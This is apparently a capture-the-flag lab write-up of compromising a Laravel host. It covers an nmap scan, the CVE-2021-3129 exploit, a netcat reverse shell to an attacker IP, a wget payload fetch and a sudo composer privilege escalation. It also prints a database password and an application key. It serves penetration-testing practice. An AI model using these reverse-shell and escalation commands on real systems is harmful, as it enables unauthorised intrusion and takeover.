#Pwned! 
```IP
192.168.194.38
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.194.38 -vvv -p- -oN enum/full
```
The output being:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNEbgprJqVJa8R95Wkbo3cemB4fdRzos+v750LtPEnRs+IJQn5jcg5l89Tx4junU+AXzLflrMVo55gbuKeNTDtFRU9ltlIu4AU+f7lRlUlvAHlNjUbU/z3WBZ5ZU9j7Xc9WKjh1Ov7chC0UnDdyr5EGrIwlLzgk8zrWx364+S4JqLtER2/n0rhVxa9RCw0tR/oL24kMep4q7rFK6dThiRtQ9nsJFhh6yw8Fmdg7r4uohqH70UJurVwVNwFqtr/86e4VSSoITlMQPZrZFVvoSsjyL8LEODt1qznoLWudMD95Eo1YFSPID5VcS0kSElfYigjSr+9bNSdlzAof1mU6xJA67BggGNu6qITWWIJySXcropehnDAt2nv4zaKAUKc/T0ij9wkIBskuXfN88cEmZbu+gObKbLgwQSRQJIpQ+B/mA8CD4AiaTmEwGSWz1dVPp5Fgb6YVy6E4oO9ASuD9Q1JWuRmnn8uiHF/nPLs2LC2+rh3nPLXlV+MG/zUfQCrdrE=
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCUhhvrIBs53SApXKZYHWBlpH50KO3POt8Y+WvTvHZ5YgRagAEU5eSnGkrnziCUvDWNShFhLHI7kQv+mx+4R6Wk=
|   256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4MSEXnpONsc0ANUT6rFQPWsoVmRW4hrpSRq++xySM9
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: W3.CSS Template
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP 80
apache 2.4.56
vue.js 2.7.14
laravel 8.4.0

# Exploitation

https://github.com/joshuavanderpoll/CVE-2021-3129
```
python CVE-2021-3129.py --host http://192.168.194.38/ --log /var/www/html/storage/logs/laravel.log
```
```
execute rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.237 443 >/tmp/f
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.237 443 >/tmp/f
```

# PrivEsc
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129120617.png?raw=true)

## Manual
mariadb 127.0.0.1:3306
interesting writable files /dev/mqueue
pspy64
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129160041.png?raw=true)

```
wget http://192.168.45.237:8000/rev.php -O rev.php
```

```
cp rev.php /var/www/html/lavita/artisan
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129160546.png?raw=true)
As skunk we have sudo permissions
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129160641.png?raw=true)
```
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >/var/www/html/lavita/composer.json
```
```
sudo /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129162513.png?raw=true)

## Automated

### Peass
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241129122446.png?raw=true)
```
mysql -p 'lavita' -u 'lavita'
```
```
sdfquelw0kly9jgbx92
```
```
APP_KEY=base64:zfXJipTpbCyrZHRDpn0/NmdpHTbAl7/hCMf476EP1LU=
```
### Mimikatz

# Lateral Movement

